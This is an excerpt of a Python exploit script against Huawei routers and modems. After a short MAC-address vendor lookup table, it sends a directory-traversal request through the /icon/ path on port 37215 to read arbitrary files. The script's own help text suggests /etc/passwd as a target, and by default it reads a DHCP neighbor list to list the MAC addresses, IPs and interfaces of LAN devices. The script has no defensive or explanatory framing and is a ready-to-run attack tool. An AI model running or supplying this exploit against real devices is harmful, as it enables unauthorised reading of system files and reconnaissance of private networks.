...
Vendors = {
	...
	"00:80:B8": "B.U.G. MORISEIKI, INCORPORATED",
	...
	"5C:F3:FC": "IBM Corp",
	"5C:F4:AB": "ZyXEL Communications Corp",
	...
	"64:B3:70": "PowerComm Solutons LLC",
	...
	"70:B3:D5": "IEEE REGISTRATION AUTHORITY - Please see OUI36 public listing for more information.",
	...
	"8C:BE:BE": "Xiaomi Technology Co.,Ltd",
	...
	"CC:C3:EA": "Motorola Mobility LLC",
	...
	"F8:E0:79": "Motorola Mobility LLC",
...
def GET_LAN(Host, Port, Path):
	Request = requests.get("http://{}:{}/icon/../../../{}".format(Host, Port, Path))
	for Line in Request.text.split("\n"):
		if len(Line) > 0:
			Information = Line.strip().split()
			if len(Information) == 3:
				print("[*] MAC Address : {} {}\n\t IpAddress : {}\n\t Interface : {}\n\n".format(Information[0], VendorName(Information[0][:8]) , Information[1], Information[2]))
			else :
				print(Line)
if __name__ == "__main__":
	ArgParser = argparse.ArgumentParser()
	ArgParser.add_argument("-ip", "--host", help="Ip address of the HUAWEI Rouer/Modem .", default="192.168.1.1")
	ArgParser.add_argument("-p", "--port", help="Port Of Remote Host .", default=37215)
	ArgParser.add_argument("-P", "--path", help="Path To file.. ex: /etc/passwd", default="/var/dhcp/dhcps/neighbors_new")
	Arguments = ArgParser.parse_args()
	GET_LAN(Arguments.host, Arguments.port, Arguments.path)